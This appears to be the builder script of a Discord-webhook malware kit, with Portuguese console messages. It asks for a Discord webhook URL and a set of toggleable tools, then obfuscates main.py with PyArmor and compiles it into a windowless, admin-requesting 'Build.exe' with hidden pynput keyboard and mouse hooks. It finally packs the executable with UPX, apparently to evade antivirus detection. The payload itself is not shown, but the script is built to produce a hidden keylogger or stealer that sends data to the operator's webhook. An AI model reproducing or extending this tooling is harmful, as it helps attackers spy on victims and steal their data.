import subprocess
import os
import json
import inquirer
import random
import time
import requests
import zipfile
import shutil

UPX_URL = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"  

def load_config():
    if os.path.exists("config.json"):
        with open("config.json", "r") as f:
            return json.load(f)
    return {}

def save_config(config):
    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

def select_options(config):
    choices = [key for key in config.keys() if key not in ["WEBHOOK", "ALERT_TITLE", "ALERT_CONTENT"]]
    
    questions = [
        inquirer.Checkbox('options',
                          message="Tools:",
                          choices=choices,
                          default=[key for key, value in config.items() if value]
                          ),
    ]
    answers = inquirer.prompt(questions)
    
    for key in config.keys():
        if key not in ["WEBHOOK", "ALERT_TITLE", "ALERT_CONTENT"]:
            config[key] = key in answers['options']
    
    if config.get("ALERT"):
        ask_alert_details(config)

def ask_webhook(config):
    questions = [
        inquirer.Text('WEBHOOK',
                      message="Enter your Discord Webhook URL:",
                      default=config.get("WEBHOOK", ""),
                      validate=lambda _, answer: answer.startswith("https://") or "URL must start with https://" in answer),
    ]
    answers = inquirer.prompt(questions)
    config["WEBHOOK"] = answers['WEBHOOK']

def ask_alert_details(config):
    questions = [
        inquirer.Text('ALERT_TITLE', message="Enter the alert title:", default=config.get("ALERT_TITLE", "")),
        inquirer.Text('ALERT_CONTENT', message="Enter the alert content:", default=config.get("ALERT_CONTENT", "")),
    ]
    answers = inquirer.prompt(questions)
    config["ALERT_TITLE"] = answers['ALERT_TITLE']
    config["ALERT_CONTENT"] = answers['ALERT_CONTENT']

def check_installation(tool_name):
    try:
        subprocess.run([tool_name, "--version"], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        print(f"{tool_name} não está instalado. Instalando...")
        subprocess.run(["pip", "install", tool_name], check=True)

def download_and_extract_upx():
    upx_zip_path = "upx.zip"
    upx_extract_dir = "upx"

    print("Baixando o UPX...")
    response = requests.get(UPX_URL, stream=True)
    with open(upx_zip_path, "wb") as f:
        shutil.copyfileobj(response.raw, f)
    
    print("Extraindo o UPX...")
    with zipfile.ZipFile(upx_zip_path, 'r') as zip_ref:
        zip_ref.extractall(upx_extract_dir)

    os.remove(upx_zip_path)
    return os.path.join(upx_extract_dir, "upx-4.0.2-win64", "upx.exe")

def check_or_install_upx():
    upx_path = os.path.join(os.getcwd(), "upx", "upx.exe")

    if not os.path.exists(upx_path):
        print("UPX não encontrado, baixando e instalando na pasta local...")
        upx_path = download_and_extract_upx()
    else:
        print(f"UPX encontrado: {upx_path}")
    
    return upx_path

def compile_main(config):
    check_installation("pyinstaller")
    check_installation("pyarmor")

    try:
        print("Ofuscando o código com PyArmor...")
        subprocess.run(["pyarmor", "pack", "-x", " --advanced 2 --onefile --noconsole", "main.py"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Erro durante a ofuscação: {e}")
        return

    save_config(config)

    command = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name=Build",
        "main.py",
        "--add-data", "config.json;."
    ]

    command.extend([
        "--windowed",  
        "--uac-admin", 
        "--hidden-import=pynput.keyboard._win32",  
        "--hidden-import=pynput.mouse._win32",
    ])

    try:
        print("Criando o executável com PyInstaller...")
        subprocess.run(command, check=True)
        
        upx_path = check_or_install_upx()
        print(f"Compactando o executável com UPX (usando {upx_path})...")
        subprocess.run([upx_path, "--best", "--ultra-brute", "--force", "dist/Build.exe"], check=True) 

        print("Build criada com sucesso.")
        print("O executável 'Build.exe' foi criado na pasta 'dist'.")
    except subprocess.CalledProcessError as e:
        print(f"Erro durante a compilação: {e}")

def delay_execution():
    delay = random.randint(5, 20)
    print(f"Aguardando {delay} segundos...")
    time.sleep(delay)

if __name__ == "__main__":
    config = load_config()
    select_options(config)
    ask_webhook(config)  
    
    delay_execution()
    
    compile_main(config)
